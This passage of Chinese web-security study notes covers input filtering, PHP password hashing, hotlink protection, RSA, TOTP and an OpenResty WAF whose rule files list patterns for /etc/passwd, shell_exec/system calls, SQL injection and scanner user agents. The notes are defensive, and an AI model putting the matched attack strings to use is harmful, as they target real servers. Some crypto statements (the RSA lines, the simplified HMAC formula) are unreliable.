  - 目录遍历漏洞：通过在 URL 或参数中构造 ../，./ 和类似的跨父目录字符串的 ASCII 编码、unicode 编码等，完成目录跳转，读取操作系统各个目录下的敏感文件
    + 需要对 URL 或者参数进行 ../，./ 等字符的转义过滤
  - 源码暴露漏洞：
* 设计缺陷
  - 返回信息过多：不要返回 用户已被禁用，统一返回 用户名或密码错误
  - 短信接口
    + 设置同一手机号短信发送间隔
    + 设置每个IP地址每日最大发送量
    + 设置每个手机号每日最大发送量
    + 升级验证码，采用滑动拼图、文字点选、图表点选...
    + 升级短信接口的验证方法

```php
$username = $_GET['username'];
$query = $pdo->prepare('SELECT * FROM users WHERE username = :username');
$query->execute(['username' => $username]);
$data = $query->fetch();

//user signup
$password = $_POST['password'];
$hashedPassword = password_hash($password, PASSWORD_DEFAULT);

//login
$password = $_POST['password'];
$hash = '1234'; //load this value from your db

if(password_verify($password, $hash)) {
  echo 'Password is valid!';
} else {
  echo 'Invalid password.';
}
```

## 两步验证和短信验证码

* 两步验证基于TOTP机制，不需要任何网络连接（包括Wi-Fi），也不需要短信和SIM卡，验证码完全在手机本地生成

## 防盗链

* 盗链是指服务提供商自己不提供服务的内容，通过技术手段绕过其它有利益的最终用户界面 (如广告)，直接在自己的网站上向最终用户提供其它服务提供商的服务内容，骗取最终用户的浏览和点击率。受益者不提供资源或提供很少的资源，而真正的服务提供商却得不到任何的收益。
* 大量消耗被盗链网站的带宽，而真正的点击率也许会很小，严重损害了被盗链网站的利益
* 解决
  - 不定期更名文件或者目录
  - 限制引用页：服务器获取用户提交信息的网站地址，然后和真正的服务端的地址相比较， 如果一致则表明是站内提交，或者为自己信任的站点提交，否则视为盗链。实现时可以使用 HTTP_REFERER1 和 htaccess 文件 (需要启用 mod_Rewrite)，结合正则表达式去匹配用户的每一个访问请求。
  - 文件伪装：目前用得最多的一种反盗链技术，一般会结合服务器端动态脚本 (PHP/JSP/ASP)。实际上用户请求的文件地址，只是一个经过伪装的脚本文件，这个脚本文件会对用户的请求作认证，一般会检查 Session，Cookie 或 HTTP_REFERER 作为判断是否为盗链的依据。而真实的文件实际隐藏在用户不能够访问的地方，只有用户通过验证以后才会返回给用户
  - 加密认证：先从客户端获取用户信息，然后根据这个信息和用户请求的文件名 字一起加密成字符串 (Session ID) 作为身份验证。只有当认证成功以后，服务端才会把用户需要的文件传送给客户。一般我们会把加密的 Session ID 作为 URL 参数的一部分传递给服务器，由于这个 Session ID 和用户的信息挂钩，所以别人就算是盗取了链接，该 Session ID 也无法通过身份认证，从而达到反盗链的目的。这种方式对于分布式盗链非常有效。
  - 随机附加码：每次，在页面里生成一个附加码，并存在数据库里，和对应的图片相关，访问图片时和此附加码对比，相同则输出图片，否则输出 404 图片
  - 加入水印

## 非对称加密

* 公钥和私钥是互相工作的，即其中一个加密另个一则可以解密。公钥加密、私钥解密，私钥解密、公钥解密，这便是非对称加密的本质。
* 在RSA（非对称加密算法）中，加密的模数通常是2次方，解密的模数通常是3次方，这意味着如果将密码长度增加一倍（比如从2048增加至4096），加密成本增加4倍，解密成本增加8倍，但在现在计算机的算力下，这只是毫秒级别的差别。笔者为了验证这一理论，亲测了用2048位和4096位的密钥加密了一个1GB的文件，所需时间基本一致（70秒左右）
* 密钥长度:一个保持前瞻的安全性与足够安全之间的选择，目前RSA破解记录为768位，1024位密钥正处于危险的边缘，而2048位的密钥已经足够安全

```sh
sudo -i
echo "deb https://apt.enpass.io/ stable main" > \
  /etc/apt/sources.list.d/enpass.list
wget -O - https://apt.enpass.io/keys/enpass-linux.key | apt-key add -
apt-get update
apt-get install enpass
exit
```

## [WAF Web Application Firewall](https://mp.weixin.qq.com/s/fLaNHRCCA6rjYNdS3ww6IA)

* 解析HTTP请求（协议解析模块），规则检测（规则模块），做不同的防御动作（动作模块），并将防御过程（日志模块）记录下来
* 模块
  - 配置模块
  - 协议解析模块
  - 规则模块
  - 动作模块
  - 错误处理模块
* 实现
  - 使用nginx+lua来实现WAF,须在编译nginx的时候配置上lua
  - 部署OpenResty,不需要在编译nginx的时候指定lua
* 功能
  - 支持IP白名单和黑名单功能，直接将黑名单的IP访问拒绝。
  - 支持URL白名单，将不需要过滤的URL进行定义。
  - 支持User-Agent的过滤，匹配自定义规则中的条目，然后进行处理（返回403）。
  - 支持CC攻击防护，单个URL指定时间的访问次数，超过设定值，直接返回403。
  - 支持Cookie过滤，匹配自定义规则中的条目，然后进行处理（返回403）。
  - 支持URL过滤，匹配自定义规则中的条目，如果用户请求的URL包含这些，返回403。
  - 支持URL参数过滤，原理同上。
  - 支持日志记录，将所有拒绝的操作，记录到日志中去。
  - 日志记录为JSON格式，便于日志分析，例如使用ELKStack进行攻击日志收集、存储、搜索和展示。
* 配置详解 `/usr/local/openresty/nginx/conf/waf/config.lua`
  - config_waf_enable = "on"        --是否启用waf模块，值为 on 或 off
  - config_log_dir = "/tmp"         --waf的日志位置，日志格式默认为json
  - config_rule_dir = "/usr/local/openresty/nginx/conf/waf/rule-config" --策略规则目录位置，可根据情况变动
  - config_white_url_check = "on"   --是否开启URL检测
  - config_white_ip_check = "on"    --是否开启IP白名单检测
    + 白名单配置: `/usr/local/openresty/nginx/conf/waf/rule-config/whiteip.rule`
  - config_black_ip_check = "on"    --是否开启IP黑名单检测
    + IP黑名单配置:`/usr/local/openresty/nginx/conf/waf/rule-config/blackip.rule`
  - config_url_check = "on"         --是否开启URL过滤 `rule-config/url.rule`
  - config_url_args_check = "on"    --是否开启Get参数过滤
  - config_user_agent_check = "on"  --是否开启UserAgent客户端过滤,中默认封锁了以下UserAgent，如 HTTrack网站下载 namp网络扫描 audit网络审计 dirbuster网站目录扫描 pangolin SQL注入工具 scan网络扫描 hydra密码暴力破解 libwww漏洞工具 sqlmap自动SQL注入工具 w3af网络扫描 Nikto Web漏洞扫描 ... 等等
  - config_cookie_check = "on"      --是否开启cookie过滤
  - config_cc_check = "on"          --是否开启cc攻击过滤
  - config_cc_rate = "10/60"        --cc攻击的速率/时间，单位为秒；默认示例中为单个IP地址在60秒内访问同一个页面次数超过10次则认为是cc攻击，则自动禁止此IP地址访问此页面60秒，60秒后解封(封禁过程中此IP地址依然可以访问其它页面，如果同一个页面访问次数超过10次依然会被禁止)
  - config_post_check = "on"        --是否开启POST检测
  - config_waf_output = "html"      --对于违反规则的请求则跳转到一个自定义html页面还是指定页面，值为 html 和 redirect
  - config_waf_redirect_url = "https://www.unixhot.com"     --指定违反请求后跳转的指定html页面
* 设定一个包含这些字符的的过滤规则
*

```sh
git clone https://github.com/unixhot/waf.git
cp -a ./waf/waf /usr/local/openresty/nginx/conf/

# /usr/local/openresty/nginx/conf/nginx.conf
http {
lua_shared_dict limit 10m;
lua_package_path "/usr/local/openresty/nginx/conf/waf/?.lua";
init_by_lua_file "/usr/local/openresty/nginx/conf/waf/init.lua";
access_by_lua_file "/usr/local/openresty/nginx/conf/waf/access.lua";
}

# failed to load the 'resty.core' module
git clone https://github.com/openresty/lua-resty-core.git

lua_shared_dict limit 10m;
lua_package_path "/usr/local/openresty/nginx/conf/waf/?.lua;/usr/local/openresty/lua-resty-core/lib/?.lua;;";
init_by_lua_file "/usr/local/openresty/nginx/conf/waf/init.lua";
access_by_lua_file "/usr/local/openresty/nginx/conf/waf/access.lua";

openresty -t && openresty -s reload

# rule-config/url.rule
\.(htaccess|bash_history)
\.(bak|inc|old|mdb|sql|backup|java|class|tgz|gz|tar|zip)$
(phpmyadmin|jmx-console|admin-console|jmxinvokerservlet)
java\.lang
\.svn\/
/(attachments|upimg|images|css|uploadfiles|html|uploads|templets|static|template|data|inc|forumdata|upload|includes|cache|avatar)/(\\w+).(php|jsp)

##  useragent.rule
(HTTrack|harvest|audit|dirbuster|pangolin|nmap|sqln|-scan|hydra|Parser|libwww|BBBike|sqlmap|w3af|owasp|Nikto|fimap|havij|PycURL|zmeu|BabyKrokodil|netsparker|httperf|bench)
#模拟网站下载
curl http://192.168.31.219/ --user-agent 'HTTrack'
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta http-equiv="Content-Language" content="zh-cn" />
<title>网站防火墙</title>
</head>
<body>
<h1 align="center"> 欢迎白帽子进行授权安全测试，安全漏洞请联系QQ：1111111。
</body>
</html>

#模拟nmap网络扫描
curl http://192.168.31.219/ --user-agent 'nmap'
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta http-equiv="Content-Language" content="zh-cn" />
<title>网站防火墙</title>
</head>
<body>
<h1 align="center"> 欢迎白帽子进行授权安全测试，安全漏洞请联系QQ：1111111。
</body>
</html>

# 异常Get参数策略配置
cat args.rule
\.\./
\:\$
\$\{
select.+(from|limit)
(?:(union(.*?)select))
having|rongjitest
sleep\((\s*)(\d*)(\s*)\)
benchmark\((.*)\,(.*)\)
base64_decode\(
(?:from\W+information_schema\W)
(?:(?:current_)user|database|schema|connection_id)\s*\(
(?:etc\/\W*passwd)
into(\s+)+(?:dump|out)file\s*
group\s+by.+\(
xwork.MethodAccessor
(?:define|eval|file_get_contents|include|require|require_once|shell_exec|phpinfo|system|passthru|preg_\w+|execute|echo|print|print_r|var_dump|(fp)open|alert|showmodaldialog)\(
xwork\.MethodAccessor
(gopher|doc|php|glob|file|phar|zlib|ftp|ldap|dict|ogg|data)\:\/
java\.lang
\$_(GET|post|cookie|files|session|env|phplib|GLOBALS|SERVER)\[
\<(iframe|script|body|img|layer|div|meta|style|base|object|input)
(onmouseover|onerror|onload)\=
```

## Google Authenticator

* 动态产生一次性口令（「OTP, One-time Password」），可以防止密码被盗用引发的安全风险
* 开启二次验证功能:弹出一个二维码，然后使用 「Google Authenticator」 APP 扫码绑定
* 解析二维码，对应字符串：otpauth://totp/Google%3Ayourname@gmail.com?secret=xxxx&issuer=Google,最重要是这一串密钥 secret，一个经过 「BASE32」 编码之后的字符串，真正使用时需要将其使用「BASE32」 解码
  - 生成一个动态码
    + 首先需要经过一个签名函数，**Google Authenticator **采用「HMAC-SHA1,一种基于哈希的消息验证码，可以用比较安全的单向哈希函数（如 SHA1）来产生签名 `hmac = SHA1(secret + SHA1(secret + input))` `input = CURRENT_UNIX_TIME() / 30` 整除 30，是为了赋予验证码一个 30 秒的有效期.对于用户输入来讲，可以有充足时间准备输入这个动态码，另外一点客户端与服务端可能存在时间偏差，30 秒的间隔可以很大概率的屏蔽这种差异
    + 得到一个长度为 40 的字符串，我们还需要将其转化为 6 位数字，方便用户输入
    + 当客户端将动态码上传给服务端，服务端查询数据库获取到用户对应的密钥，然后使用同样的算法进行处理生成一个动态码，最后比较客户端上传动态码与服务端生成是否一致
* 密钥客户端与服务端将会同时保存一份，两端将会同样的算法计算，以此用来比较动态码的正确性。

```
original_secret = xxxx xxxx xxxx xxxx xxxx xxxx xxxx xxxx
secret = BASE32_DECODE(TO_UPPERCASE(REMOVE_SPACES(original_secret)))
input = CURRENT_UNIX_TIME() / 30
hmac = SHA1(secret + SHA1(secret + input))
four_bytes = hmac[LAST_BYTE(hmac):LAST_BYTE(hmac) + 4]
large_integer = INT(four_bytes)
small_integer = large_integer % 1,000,000
```

## 案例

* [710leo/ZVulDrill](https://github.com/710leo/ZVulDrill):Web漏洞演练平台

## 产品

* Arachni
* XssPy
* w3af
* Nikto
* Wfuzz
* OWASP ZAP
* Wapiti
* Vega
* SQLmap
* Grabber
* Golismero
* OWASP Xenotix XSS
* [IBM Security AppScan](http://www-03.ibm.com/software/products/en/appscan)
* Messus
* Snort
* Nagios
* Ettercap
* Infection MOnkey
* Delta
* Cuckoo sandbox
* Lynis
* [网站体检工具](https://ziyuan.baidu.com/safe/index)
* [火绒](https://www.huorong.cn/)

## 课程

* [CS 253 Web Security](https://web.stanford.edu/class/cs253/)
* The Web Application Hacker's Handbook: Finding and Exploiting Security Flaws 2nd Edition
* [How to Build a Cybersecurity Career [ 2019 Update ]](https://danielmiessler.com/blog/build-successful-infosec-career/)
* [Ruby on Rails的Web安全的开发教程](https://guides.rubyonrails.org/security.html)

## 图书

* [The Web Application Hacker’s Handbook](https://www.amazon.com/dp/0470170778/?tag=stackoverflow17-20).

## 工具

* [rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework):Metasploit Framework https://www.metasploit.com/
* [sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap):Automatic SQL injection and database takeover tool http://sqlmap.org
* [s0md3v/XSStrike](https://github.com/s0md3v/XSStrike):Most advanced XSS detection suite. https://somdev.me/XSStrike/
* [netxfly/sec_check](https://github.com/netxfly/sec_check):Cross platform security detection tool
* [用户信息监控](https://monitor.firefox.com/ )
* [minimaxir/big-list-of-naughty-strings](https://github.com/minimaxir/big-list-of-naughty-strings):The Big List of Naughty Strings is a list of strings which have a high probability of causing issues when used as user-input data.
* 密码管理
  - [Bitwarden](https://bitwarden.com/):Solve your password management problems
  - [keeweb/keeweb](https://github.com/keeweb/keeweb):Free cross-platform password manager compatible with KeePass https://keeweb.info
  - [Passbolt](https://www.passbolt.com/)
  - [Enpass](https://www.enpass.io)

## 参考

* [OWASP 开发指导](https://www.owasp.org/index.php/OWASP_Guide_Project) 涵盖了几乎所有关于Web站点安全的东西
  - OWASP(开放Web应用安全项目- Open Web Application Security Project)是一个开放的非营利性组织，目前全球有130个分会近万名会员，其主要目标是研议协助解决Web软体安全之标准、工具与技术文件，长期 致力于协助政府或企业了解并改善网页应用程式与网页服务的安全性
  - OWASP被视为Web应用安全领域的权威参考。2009年下列发布的美国国家和国际立法、标准、准则、委员会和行业实务守则参考引用了OWASP。美国联邦贸易委员会(FTC)强烈建议所有企业需遵循OWASP十大WEB弱点防护守则）
  * [OWASP™ Foundation](https://www.owasp.org/index.php/Main_Page):the free and open software security community
  * [The Google Browser Security Handbook](https://code.google.com/p/browsersec/wiki/Main).
* [Hacker0x01/hacker101](https://github.com/Hacker0x01/hacker101):Hacker101 https://www.hacker101.com
* [Mozilla的安全编程规范](https://wiki.mozilla.org/WebAppSec/Secure_Coding_Guidelines)
* [SecWiki/sec-chart](https://github.com/SecWiki/sec-chart):安全思维导图集合 https://www.sec-wiki.com
* [phith0n/Mind-Map](https://github.com/phith0n/Mind-Map):各种安全相关思维导图整理收集
* [trimstray/the-book-of-secret-knowledge](https://github.com/trimstray/the-book-of-secret-knowledge):💫 A collection of awesome lists, manuals, blogs, hacks, one-liners, cli/web tools and more. Especially for System and Network Administrators, DevOps, Pentesters or Security Researchers.
* [Micropoor/Micro8](https://github.com/Micropoor/Micro8):Gitbook https://micro8.gitbook.io/micro8/
* [hacker-tools](https://hacker-tools.github.io/lectures/)
* [danielmiessler/SecLists](https://github.com/danielmiessler/SecLists):SecLists is the security tester's companion. It's a collection of multiple types of lists used during security assessments, collected in one place. List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more.https://www.owasp.org/index.php/OWASP_Internet_of_Things_Project
